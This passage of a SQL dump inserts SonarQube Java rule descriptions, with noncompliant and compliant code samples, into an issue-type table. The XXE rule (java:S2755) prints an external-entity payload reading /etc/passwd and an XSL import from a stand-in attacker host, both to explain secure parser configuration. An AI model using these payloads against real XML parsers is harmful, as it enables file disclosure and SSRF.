<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,
the pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>
<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoSomething() {  // Noncompliant
  MyClass myClass = new MyClass();
  myClass.doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>
<pre>
import com.company.CompareToTester;

@Test
public void testDoSomething() {
  MyClass myClass = new MyClass();
  assertNull(myClass.doSomething());  // JUnit assertion
  assertThat(myClass.doSomething()).isNull();  // Fest assertion
}

@Test
public void testDoSomethingElse() {
  MyClass myClass = new MyClass();
  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter
  CompareToTester.compareStatic(myClass);  // Compliant
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2701', 'Literal boolean values and nulls should not be used in assertions', 'sonarqube', 'Code Smell', '<p>There''s no reason to use literal boolean values or nulls in assertions. Instead of using them with <em>assertEquals</em>, <em>assertNotEquals</em>
and similar methods, you should be using <em>assertTrue</em>, <em>assertFalse</em>, <em>assertNull</em> or <em>assertNotNull</em> instead (or
<em>isNull</em> etc. when using Fest). Using them with assertions unrelated to equality (such as <em>assertNull</em>) is most likely a bug.</p>
<p>Supported frameworks:</p>
<ul>
  <li> JUnit3 </li>
  <li> JUnit4 </li>
  <li> JUnit5 </li>
  <li> Fest assert </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Assert.assertTrue(true);  // Noncompliant
assertThat(null).isNull(); // Noncompliant

assertEquals(true, something()); // Noncompliant
assertNotEquals(null, something()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
assertTrue(something());
assertNotNull(something());
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2718', '"DateUtils.truncate" from Apache Commons Lang library should not be used', 'sonarqube', 'Code Smell', '<p>The use of the <code>ZonedDateTime</code> class introduced in Java 8 to truncate a date can be significantly faster than the <code>DateUtils</code>
class from Commons Lang.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Date trunc(Date date) {
  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public Date trunc(Date date) {
  Instant instant = date.toInstant();
  ZonedDateTime zonedDateTime = instant.atZone(ZoneId.systemDefault());
  ZonedDateTime truncatedZonedDateTime = zonedDateTime.truncatedTo(ChronoUnit.SECONDS);
  Instant truncatedInstant = truncatedZonedDateTime.toInstant();
  return Date.from(truncatedInstant);
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2737', '"catch" clauses should do more than rethrow', 'sonarqube', 'Code Smell', '<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {  // Noncompliant
    throw e;
  }
  return sb.toString();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {
    logger.LogError(e);
    throw e;
  }
  return sb.toString();
}
</pre>
<p>or</p>
<pre>
public String readFile(File f) throws IOException {
  StringBuilder sb = new StringBuilder();
  FileReader fileReader = new FileReader(fileName);
  BufferedReader bufferedReader = new BufferedReader(fileReader);

  while((line = bufferedReader.readLine()) != null) {
    //...

  return sb.toString();
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2755', 'XML parsers should not be vulnerable to XXE attacks', 'sonarqube', 'Vulnerability', '<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
network access ...) which could lead to vulnerabilities such as confidential file disclosures or <a
href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>.</p>
<p>Example in this XML document, an external entity read the /etc/passwd file:</p>
<pre>
&lt;?xml version="1.0" encoding="utf-8"?&gt;
  &lt;!DOCTYPE test [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
  &lt;to&gt;&amp;xxe;&lt;/to&gt;
  &lt;from&gt;Jani&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don''t forget me this weekend!&lt;/body&gt;
&lt;/note&gt;
</pre>
<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl"&gt;
  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
 &lt;xsl:template match="/"&gt;
  &amp;content;
 &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre>
<p>It is recommended to disable access to external entities and network access in general.</p>
<p>To protect Java XML Parsers from XXE attacks <a
href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-94ABC0EE-9DC8-44F0-84AD-47ADD5340477">these
properties</a> have been defined since JAXP 1.5:</p>
<ul>
  <li> ACCESS_EXTERNAL_DTD: should be set to "" when processing XML/XSD/XLS files (it looks for external DOCTYPEs) </li>
  <li> ACCESS_EXTERNAL_SCHEMA: should be set to "" when processing XML/XSD/XLS files (it looks for external schemalocation ect) </li>
  <li> ACCESS_EXTERNAL_STYLESHEET should be set to "" when processing XLS file (it looks for external imports, includes ect); </li>
</ul>
<p>Note that <a href="http://xerces.apache.org/xerces2-j/">Apache Xerces</a> is still based on JAXP 1.4, therefore one solution is to set to
<code>false</code> the <a href="http://xerces.apache.org/xerces2-j/features.html#external-general-entities">external-general-entities</a> feature.</p>
<p>Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the implementation:</p>
<ul>
  <li> it has <a
  href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-88B04BE2-35EF-4F61-B4FA-57A0E9102342">no effect</a> to protect the parser from XXE attacks but helps guard against excessive memory consumption from XML processing. </li>
  <li> or it''s just an obscur shortcut (it could set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to "" but without guarantee). </li>
</ul>
<p>When setting <a href="https://docs.oracle.com/javase/7/docs/api/org/xml/sax/XMLReader.html#setEntityResolver(org.xml.sax.EntityResolver)">an entity
resolver</a> to <code>null</code> (eg: <code>setEntityResolver(null)</code>) the parser will use its own resolution, which is unsafe.</p>
<h2>Noncompliant Code Examples</h2>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = df.newDocumentBuilder();  // Noncompliant
Document document = builder.parse(new InputSource(xml));
DOMSource domSource = new DOMSource(document);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
SaxHandler handler = new SaxHandler();
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();  // Noncompliant
parser.parse(xml, handler);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInputFactory</a> library:</p>
<pre>
XMLInputFactory factory = XMLInputFactory.newInstance();  // Noncompliant
XMLEventReader eventReader = factory.createXMLEventReader(new FileReader("xxe.xml"));
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">TransformerFactory</a> library:</p>
<pre>
String xslt = "xxe.xsl";
String xml = "xxe.xml";
TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();  // Noncompliant
Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));

StringWriter writer = new StringWriter();
transformer.transform(new StreamSource(xml), new StreamResult(writer));
String result = writer.toString();
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">SchemaFactory</a> library:</p>
<pre>
String xsd = "xxe.xsd";
StreamSource xsdStreamSource = new StreamSource(xsd);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);  // Noncompliant
Schema schema = schemaFactory.newSchema(xsdStreamSource);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html">Validator</a> library:</p>
<pre>
String xsd = "xxe.xsd";
String xml = "xxe.xml";
StreamSource xsdStreamSource = new StreamSource(xsd);
StreamSource xmlStreamSource = new StreamSource(xml);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
Schema schema = schemaFactory.newSchema(xsdStreamSource);
Validator validator = schema.newValidator();   // Noncompliant

StringWriter writer = new StringWriter();
validator.validate(xmlStreamSource, new StreamResult(writer));
</pre>
<p><a href="https://dom4j.github.io/">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader = new SAXReader(); // Noncompliant by default
Document xmlResponse = xmlReader.read(xml);
</pre>
<p><a href="http://www.jdom.org/">Jdom2</a> library:</p>
<pre>
SAXBuilder builder = new SAXBuilder(); // Noncompliant by default
Document document = builder.build(new File(xml));
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
DocumentBuilder builder = df.newDocumentBuilder();
Document document = builder.parse(new InputSource(xml));
DOMSource domSource = new DOMSource(document);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
SaxHandler handler = new SaxHandler();
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
parser.parse(xml, handler);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInputFactory</a> library:</p>
<pre>
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");  // compliant

XMLEventReader eventReader = factory.createXMLEventReader(new FileReader("xxe.xml"));
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">TransformerFactory</a> library:</p>
<pre>
String xslt = "xxe.xsl";
String xml = "xxe.xml";
TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();
transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, ""); // Compliant
// ACCESS_EXTERNAL_SCHEMA not supported in several TransformerFactory implementations
Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));

StringWriter writer = new StringWriter();
transformer.transform(new StreamSource(xml), new StreamResult(writer));
String result = writer.toString();
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">SchemaFactory</a> library:</p>
<pre>
String xsd = "xxe.xsd";
StreamSource xsdStreamSource = new StreamSource(xsd);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // Compliant
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
Schema schema = schemaFactory.newSchema(xsdStreamSource);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html">Validator</a> library:</p>
<pre>
String xsd = "xxe.xsd";
String xml = "xxe.xml";
StreamSource xsdStreamSource = new StreamSource(xsd);
StreamSource xmlStreamSource = new StreamSource(xml);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
Schema schema = schemaFactory.newSchema(xsdStreamSource);
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
// validators will also inherit of these properties
Validator validator = schema.newValidator();

validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");   // Compliant
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");   // Compliant

StringWriter writer = new StringWriter();
validator.validate(xmlStreamSource, new StreamResult(writer));
</pre>
<p>For <a href="https://dom4j.github.io/">dom4j</a> library, ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA are not supported, thus a very strict fix
is to disable doctype declarations:</p>
<pre>
SAXReader xmlReader = new SAXReader();
xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // Compliant
Document xmlResponse = xmlReader.read(xml);
</pre>
<p><a href="http://www.jdom.org/">Jdom2</a> library:</p>
<pre>
SAXBuilder builder = new SAXBuilder(); // Compliant
builder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
builder.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // Compliant
Document document = builder.build(new File(xml));
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
  (XXE) </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">OWASP XXE Prevention Cheat
  Sheet</a> </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2757', '"=+" should not be used instead of "+="', 'sonarqube', 'Bug', '<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what''s meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2761', 'Unary prefix operators should not be repeated', 'sonarqube', 'Bug', '<p>The needless repetition of an operator is usually a typo. There is no reason to write <code>!!!i</code> when <code>!i</code> will do.</p>
<p>On the other hand, the repetition of increment and decrement operators may have been done on purpose, but doing so obfuscates the meaning, and
should be simplified.</p>
<p>This rule raises an issue for sequences of: <code>!</code>, <code>~</code>, <code>-</code>, and <code>+</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 1;

int j = - - -i;  // Noncompliant; just use -i
int k = ~~~i;    // Noncompliant; same as i
int m = + +i;    // Noncompliant; operators are useless here

boolean b = false;
boolean c = !!!b;   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i =  1;

int j = -i;
int k = ~i;
int m =  i;

boolean b = false;
boolean c = !b;
</pre>
<h2>Exceptions</h2>
<p>Overflow handling for GWT compilation using <code>~~</code> is ignored.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2786', 'Nested "enum"s should not be declared static', 'sonarqube', 'Code Smell', '<p>According to <a href="http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9">the Java Language Specification-8.9</a>:</p>
<blockquote>
  <p>Nested enum types are implicitly <code>static</code>.</p>
</blockquote>
<p>So there''s no need to declare them <code>static</code> explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Flower {
  static enum Color { // Noncompliant; static is redundant here
    RED, YELLOW, BLUE, ORANGE
  }

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Flower {
  enum Color { // Compliant
    RED, YELLOW, BLUE, ORANGE
  }

  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2789', '"null" should not be used with "Optional"', 'sonarqube', 'Bug', '<p>The concept of <code>Optional</code> is that it will be used when <code>null</code> could cause errors. In a way, it replaces <code>null</code>,
and when <code>Optional</code> is in use, there should never be a question of returning or receiving <code>null</code> from a call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething () {
  Optional&lt;String&gt; optional = getOptional();
  if (optional != null) {  // Noncompliant
    // do something with optional...
  }
  Optional&lt;String&gt; text = null; // Noncompliant, a variable whose type is Optional should never itself be null
  // ...
}

@Nullable // Noncompliant
public Optional&lt;String&gt; getOptional() {
  // ...
  return null;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething () {
  Optional&lt;String&gt; optional = getOptional();
  optional.ifPresent(
    // do something with optional...
  );
  Optional&lt;String&gt; text = Optional.empty();
  // ...
}

public Optional&lt;String&gt; getOptional() {
  // ...
  return Optional.empty();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2864', '"entrySet()" should be iterated when both the key and value are needed', 'sonarqube', 'Code Smell', '<p>When only the keys from a map are needed in a loop, iterating the <code>keySet</code> makes sense. But when both the key and the value are needed,
it''s more efficient to iterate the <code>entrySet</code>, which will give access to both the key and value, instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingWithMap(Map&lt;String,Object&gt; map) {
  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved
    Object value = map.get(key);
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingWithMap(Map&lt;String,Object&gt; map) {
  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {
    String key = entry.getKey();
    Object value = entry.getValue();
    // ...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2885', 'Non-thread-safe fields should not be static', 'sonarqube', 'Bug', '<p>Not all classes in the standard Java library were written to be thread-safe. Using them in a multi-threaded manner is highly likely to cause data
problems or exceptions at runtime.</p>
<p>This rule raises an issue when an instance of <code>Calendar</code>, <code>DateFormat</code>, <code>javax.xml.xpath.XPath</code>, or
<code>javax.xml.validation.SchemaFactory</code> is marked <code>static</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private static SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");  // Noncompliant
  private static Calendar calendar = Calendar.getInstance();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");
  private Calendar calendar = Calendar.getInstance();
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2886', 'Getters and setters should be synchronized in pairs', 'sonarqube', 'Bug', '<p>When one part of a getter/setter pair is <code>synchronized</code> the other part should be too. Failure to synchronize both sides of a pair may
result in inconsistent behavior at runtime as callers access an inconsistent method state.</p>
<p>This rule raises an issue when either the method or the contents of one method in a getter/setter pair are synchrnoized but the other is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person {
  String name;
  int age;

  public synchronized void setName(String name) {
    this.name = name;
  }

  public String getName() {  // Noncompliant
    return this.name;
  }

  public void setAge(int age) {  // Noncompliant
    this.age = age;
  }

  public int getAge() {
    synchronized (this) {
      return this.age;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person {
  String name;
  int age;

  public synchronized void setName(String name) {
    this.name = name;
  }

  public synchronized String getName() {
    return this.name;
  }

  public void setAge(int age) {
    synchronized (this) {
      this.age = age;
   }
  }

  public int getAge() {
    synchronized (this) {
      return this.age;
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4jdGBQ">CERT, VNA01-J.</a> - Ensure visibility of shared references to immutable objects </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2912', '"indexOf" checks should use a start position', 'sonarqube', 'Code Smell', '<p>One thing that makes good code good is the clarity with which it conveys the intent of the original programmer to maintainers, and the proper
choice of <code>indexOf</code> methods can help move code from confusing to clear.</p>
<p>If you need to see whether a substring is located beyond a certain point in a string, you can test the <code>indexOf</code> the substring versus
the target point, or you can use the version of <code>indexOf</code> which takes a starting point argument. The latter is arguably clearer because the
result is tested against -1, which is an easily recognizable "not found" indicator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String name = "ismael";

if (name.indexOf("ae") &gt; 2) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String name = "ismael";

if (name.indexOf("ae", 2) &gt; -1) {
  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2924', 'JUnit rules should be used', 'sonarqube', 'Code Smell', '<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and
there''s no reason to leave them cluttering up the file if they''re not in use.</p>
<p>This rule raises an issue when <code>Test</code> class fields of the following types aren''t used by any of the test methods:
<code>TemporaryFolder</code>, and <code>TestName</code>.</p>
<p>This rule also applies to the JUnit 5 equivalent classes: <code>TempDir</code>, and <code>TestInfo</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ProjectDefinitionTest {

  @Rule
  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey("mykey");
    assertThat(def.getKey(), is("mykey"));
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ProjectDefinitionTest {

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey("mykey");
    assertThat(def.getKey(), is("mykey"));
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2925', '"Thread.sleep" should not be used in tests', 'sonarqube', 'Code Smell', '<p>Using <code>Thread.sleep</code> in a test is just generally a bad idea. It creates brittle tests that can fail unpredictably depending on
environment ("Passes on my machine!") or load. Don''t rely on timing (use mocks) or use libraries such as <code>Awaitility</code> for asynchroneous
testing. </p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoTheThing(){

  MyClass myClass = new MyClass();
  myClass.doTheThing();

  Thread.sleep(500);  // Noncompliant
  // assertions...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testDoTheThing(){

  MyClass myClass = new MyClass();
  myClass.doTheThing();

  await().atMost(2, Duration.SECONDS).until(didTheThing());  // Compliant
  // assertions...
}

private Callable&lt;Boolean&gt; didTheThing() {
  return new Callable&lt;Boolean&gt;() {
    public Boolean call() throws Exception {
      // check the condition that must be fulfilled...
    }
  };
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2959', 'Unnecessary semicolons should be omitted', 'sonarqube', 'Code Smell', '<p>Under the reasoning that cleaner code is better code, the semicolon at the end of a try-with-resources construct should be omitted because it can
be omitted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);  // ignored; this one''s required
      Reader r = new InputStreamReader(b);)   // Noncompliant
{
   //do stuff
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);
      Reader r = new InputStreamReader(b))
{
   //do stuff
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2970', 'Assertions should be complete', 'sonarqube', 'Code Smell', '<p>It is very easy to write incomplete assertions when using some test frameworks. This rule enforces complete assertions in the following cases:</p>
<ul>
  <li> Fest: <code>assertThat</code> is not followed by an assertion invocation </li>
  <li> AssertJ: <code>assertThat</code> is not followed by an assertion invocation </li>
  <li> Mockito: <code>verify</code> is not followed by a method invocation </li>
  <li> Truth: <code>assertXXX</code> is not followed by an assertion invocation </li>
</ul>
<p>In such cases, what is intended to be a test doesn''t actually verify anything</p>
<h2>Noncompliant Code Example</h2>
<pre>
// Fest
boolean result = performAction();
// let''s now check that result value is true
assertThat(result); // Noncompliant; nothing is actually checked, the test passes whether "result" is true or false

// Mockito
List mockedList = Mockito.mock(List.class);
mockedList.add("one");
mockedList.clear();
// let''s check that "add" and "clear" methods are actually called
Mockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()
</pre>
<h2>Compliant Solution</h2>
<pre>
// Fest
boolean result = performAction();
// let''s now check that result value is true
assertThat(result).isTrue();

// Mockito
List mockedList = Mockito.mock(List.class);
mockedList.add("one");
mockedList.clear();
// let''s check that "add" and "clear" methods are actually called
Mockito.verify(mockedList).add("one");
Mockito.verify(mockedList).clear();
</pre>
<h2>Exceptions</h2>
<p>Variable assignments and return statements are skipped to allow helper methods.</p>
<pre>
private BooleanAssert check(String filename, String key) {
  String fileContent = readFileContent(filename);
  performReplacements(fileContent);
  return assertThat(fileContent.contains(key)); // No issue is raised here
}

@Test
public void test() {
  check("foo.txt", "key1").isTrue();
  check("bar.txt", "key2").isTrue();
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2972', 'Inner classes should not have too many lines of code', 'sonarqube', 'Code Smell', '<p>Inner classes should be short and sweet, to manage complexity in the overall file. An inner class that has grown longer than a certain threshold
should probably be externalized to its own file.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2973', 'Escaped Unicode characters should not be used', 'sonarqube', 'Code Smell', '<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>
<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a
printable character.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String prefix = "ne"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String prefix = "née";
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
